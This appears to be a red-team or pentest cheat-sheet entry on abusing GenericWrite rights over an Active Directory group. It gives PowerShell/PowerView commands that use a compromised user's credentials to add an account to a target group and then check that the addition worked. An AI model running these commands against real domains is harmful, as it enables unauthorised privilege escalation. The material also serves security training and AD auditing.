# GenericWrite
## On a `Group` Object AddMember

1. **Authenticate as the Compromised User**:  
   - Create a `PSCredential` object for the user with group modification rights:  
     ```powershell
     $SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
     $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\USERNAME', $SecPassword)
     ```  
     *(Replace `DOMAIN\USERNAME` and `<PASSWORD>` with the target user's credentials, e.g., `corp.com\ali`).*  

2. **Verify Current Group Membership**:  
   - Check existing members of the target group (e.g., `Help Desk Level 1`):  
     ```powershell
     Get-DomainGroupMember -Identity "GROUP_NAME" | Select MemberName
     ```  
     or using native AD cmdlets:  
     ```powershell
     Get-ADGroupMember -Identity "GROUP_NAME" | Select-Object Name
     ```  

3. **Add the User to the Group**:  
   - Use PowerView's `Add-DomainGroupMember` (or `Add-ADGroupMember`):  
     ```powershell
     Add-DomainGroupMember -Identity 'GROUP_NAME' -Members 'TARGET_USER' -Credential $Cred -Verbose
     ```  
     *(Replace `GROUP_NAME` and `TARGET_USER` with the group and user to add, e.g., `Help Desk Level 1` and `ali`).*  

4. **Confirm Success**:  
   - Re-run the membership check to ensure the user was added:  
     ```powershell
     Get-DomainGroupMember -Identity "GROUP_NAME" | Where-Object { $_.MemberName -eq 'TARGET_USER' }
     ```  
